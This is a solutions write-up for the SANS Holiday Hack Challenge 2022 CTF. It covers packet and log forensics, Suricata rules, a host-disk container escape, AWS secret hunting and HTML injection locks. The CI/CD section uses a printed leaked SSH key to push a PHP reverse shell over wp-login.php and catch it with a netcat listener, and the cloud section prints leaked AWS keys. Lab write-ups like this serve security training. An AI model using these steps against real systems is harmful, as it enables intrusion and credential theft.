[Tolkien Ring](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2022_solutions.md#tolkien-ring)

[Elfen Ring](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2022_solutions.md#elfen-ring)

[Web Ring](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2022_solutions.md#web-ring)

[Cloud Ring](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2022_solutions.md#cloud-ring)

[Burning Ring of Fire](https://github.com/TechnoSavage/CTF/blob/main/SANS_HHC/2022_solutions.md#burning-ring-of-fire)


# Tolkien Ring

## Wireshark Practice

### What kind of objects can we export?
- export objects -> https

#### Answer: `http`

### What is the name of the largest object?

#### Answer: `app.php`

### What packet does it start at?

#### Answer: `packet 687`

### What is the IP of the apache server?
filter:
```
http
```

#### Answer: `192.185.57.242`

### What file is saved to the affected host?

#### Answer: `Ref_Sept24-2020.zip`

### What are the bad TLS cert country codes?

filter: 
```
ip.addr==10.9.24.101 && x509sat.CountryName
```

#### Answer: `Ireland, Israel, South Sudan, United States`

### Is the host infected?

#### Answer: `yes`

## Windows Event Logs:

### What date did the attack take place?

- filter event ID 4104
- sort on 'task category' 'execute a remote command' event ID 4104, find where recipe_updated.txt was deleted -> `12/24/2022`

#### Answer: `12/24/2022`

### An attacker got a secret from a file; what was the file's original name?

#### Answer: `Recipe` (4103 6:00:58)

### the contents of the file were copied, modified, and stored to a variable multiple times, what is the last full powershell line where this was done?
    
#### Answer: `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}`

### Command that wrote variable to the file, what was the command?
 
#### Answer: `$foo | Add-Content -Path 'Recipe'`

### The attacker ran this command against a file multiple times, what was the name of the file?

#### Answer: `recipe.txt`

### Were any files deleted?

#### Answer: `Yes`

### Was the original file deleted?

#### Answer: `No`

### What is the event ID that showed the command being executed?

#### Answer: `4104`

### Was the secret ingredient compromised?

#### Answer: `Yes`

### What was the secret ingredient?

- `cat .\recipe.txt` states the secret ingredient is honey and this was modified to fish oil + the output of 4103

#### Answer: `honey`

## Suricata Regatta:

### Block DNS lookup of adv.epostoday.uk, alert "Known bad DNS lookup, possible Dridex infection"

```    
drop dns $HOME_NET any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"epostoday.uk"; nocase; sid:68768689; rev:1;)
```

### alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection 

```    
alert http $HOME_NET any <> any any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:68768690; rev:1;)
```

### naughty actors are using TLS certificates with a specific CN...alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.,...the message (msg) should read Investigate bad certificates, possible Dridex infection

```
alert tls $HOME_NET any <> any any (msg:"Investigate bad certificates, possible Dridex infection"; content:"heardbellith.Icanwepeh.nagoya"; nocase; sid:68768691; rev:1;)
```

### one line from the JavaScript: let byteCharacters = atob...that string might be GZip compressed...alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection

```
alert http $HOME_NET any <> any any (msg:"Suspicious JavaScript function, possible Dridex infection"; http.response_body; content:"let byteCharacters = atob"; sid:68768692; rev:1;)
```

# Elfen Ring

## Git clone repo:

- change to `git clone https://haugfactory.com/asnowball/aws_scripts.git`

```    
cd aws_scripts && cat README.md
    
runtoanswer maintainers
```

## Prison Escape:

- samways can sudo to root

```    
sudo -s
cd /mnt && mkdir breakout
mount /dev/vda breakout
cd /breakout/home/jailer/.ssh
cat jail.key.priv
```
#### Flag: `one step closer 082bb339ec19de4935867`

## CI/CD:

```    
mkdir web shell
cd web && git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
cd wordpress.flag.internal
git log
```
- look for **"whoops"** in comments

```
git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
ls -lah
```
- reveals that a **.ssh** was accidentally included in the push and subsequently removed

```    
cp -r .ssh ~/.ssh

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU59wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com

cd && chmod 700 .ssh && cd .ssh

touch known_hosts && mv .deploy deploy && mv .deploy.pub deploy.pub
    
chmod 600 deploy && chmod 644 deploy.pub && cd ~/shell
    
eval $(ssh-agent -s)
    
ssh-add ~/.ssh/deploy
    
ssh -Tvvvv git@gitlab.flags.net.internal
    
git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
```

- copy PHP reverse shell into github repo (as shell.php)
- configure PHP reverse shell (ip and port)

```    
mv wp-login.php wp-login.php.old

mv shell.php wp-login.php

git config user.email sporx@kringlecon.com

git config user.name knee-oh

git add *

git commit -m '.'

git push
```

- start netcat listener in background 

```    
nc -lvnp 4444 &

curl http://wordpress.flag.net.internal/wp-login.php
```

- receive shell, I had to background and fg again to get shell output

```
cat flag.txt
```

#### Flag: `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`

# Web Ring

## Bad IP:
- Open wireshark -> statistics -> protocol hierarchy
- url encoded form data suspicious -> apply as filter

#### Answer: `18.222.86.32`

## Credential Mining:

Filter:
``` 
ip.src==18.222.86.32 && http 
```
or
```
ip.src==18.222.86.32 && http.request.uri contains login
```

#### first login username: `Alice`

## 404 FTW:

first successful url:

filter:
```
ip.src == 18.222.86.32
 
ip.src==18.222.86.32 && http || ip.dst==18.222.86.32 && http && !http.response.code==404 
```

#### Answer: `/proc`

## IMDS, XXE, and Other Abbreviations:

- Scroll down

#### Answer: `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`

## Open Boria Mine Door:

### Lock 1:

```    
@&@&&W&&W&&&& 
```

or same as lock 2

### Lock 2: 

```    
<span style="font-size:180px"><strong>WWWW</span><svg width="200" height="200"><rect width="100%" height="100%" fill="white" /></svg>
```

### Lock 3:

```    
<svg width="200" height="200"><rect width="100%" height="100%" fill="blue" /></svg>
```

### Lock 4: 

- use enter key rather than 'go' button i.e. bypass onblur input sanitization

```
<svg width="200" height="200"><rect x="0" y="0" width="100%" height="100%" fill="white" /><rect x="0" y="100" width="100%" height="100%" fill="blue" /></svg>
```

### Lock 5:
- use enter key rather than 'go' button i.e. bypass onblur input sanitization

```
<svg width="200" height="200"><rect x="0" y="0" width="100%" height="100%" fill="red" /><rect x="25" y="80" width="100%" height="100%" fill="blue" /></svg>
```

### Lock 6:

```    
<svg width="200" height="200"><rect x="0" y="0" width="100%" height="100%" fill="lime" /><rect x="0" y="50" width="100%" height="100%" fill="red" /><rect x="0" y="115" width="100%" height="100%" fill="blue" /></svg>
```

# Cloud Ring

## AWS CLI Intro:

### access help: 

```    
aws help
```

### add credentials: 

```    
aws configure
```

### enter settings

```    
get caller identity: aws sts get-caller-identity
    
{
"UserId": "AKQAAYRKO7A5Q5XUY2IY",
"Account": "602143214321",
"Arn": "arn:aws:iam::602143214321:user/elf_helpdesk"
}
```

## Trufflehog search:

```
trufflehog https://haugfactory.com/orcadmin/aws_scripts

Reason: High Entropy
Date: 2022-09-06 16:10:48
Hash: 422708564ef952ff28ce719ab6dc15002fa84a6e
Filepath: put_policy.py
Branch: origin/main
Commit: added
            
@@ -1,15 +0,0 @@
-import boto3
-import json
-
-
-iam = boto3.client('iam',
-    region_name='us-east-1',
-    aws_access_key_id="AIDAYRANYAHGQOHD7OUSS",
-    aws_secret_access_key="e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL",
-)
-# arn:aws:ec2:us-east-1:accountid:instance/*
-response = iam.put_user_policy(
-    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["ssm:SendCommand"],"Resource":["arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5","arn:aws:ec2:us-east-1:748127089694:document/RestartServices"]}]}',
-    PolicyName='AllAccessPolicy',
-    UserName='elf_test',
-)
```

#### Answer: `put_policy.py`

## Exploitation via AWS CLI:

```    
trufflehog https://haugfactory.com/asnowball/aws_scripts.git 
```

- Alternatively, you may need to git clone repo and git checkout the commit where secrets were found and cat put_policy.py to view the secret access key

```
Reason: High Entropy
Date: 2022-09-07 10:53:32
Hash: 3476397f95da11a776d4118f1f9ae6c9d4afd0c9
Filepath: put_policy.py
Branch: origin/main
Commit: added

@@ -4,8 +4,8 @@ import json

iam = boto3.client('iam',
    region_name='us-east-1',
-    aws_access_key_id=ACCESSKEYID,
-    aws_secret_access_key=SECRETACCESSKEY,
+    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
+    aws_secret_access_key="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",
)
# arn:aws:ec2:us-east-1:accountid:instance/*
response = iam.put_user_policy(
```

### aws configure (enter settings)

```
aws sts get-caller-identity

{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
```

### find attached user policies:

```
aws iam list-attached-user-policies --user-name haug

{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}
```

### get attached user policies:

```
aws iam get-policy --user-name haug --policy-name TIER1_READONLY_POLICY --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY

{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}
```

### view default version:

``` 
aws iam get-policy-version --policy-name TIER1_READONLY_POLICY --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
```

### view inline policies for user
``` 
aws iam list-user-policies --user-name haug
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}
```

### Get inline policy

```
aws iam get-user-policy --policy-name S3Perms --user-name haug
```

### list bucket objects

```
aws s3api list-objects --bucket smogmachines3
```

### list lambda functions

```
aws lambda list-functions
```

### get public URL of lambda

```    
aws lambda get-function-url-config --function-name  smogmachine_lambda
```

# Burning Ring of Fire

## Buy a hat:

- not much to say

## Blockchain Divination:

### What is the address of KringleCoin smart contract?

- Navigate to the very beginning of the blockchain and look for the smart contract creation

#### Answer: `0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554`

## Exploit a smart contract:
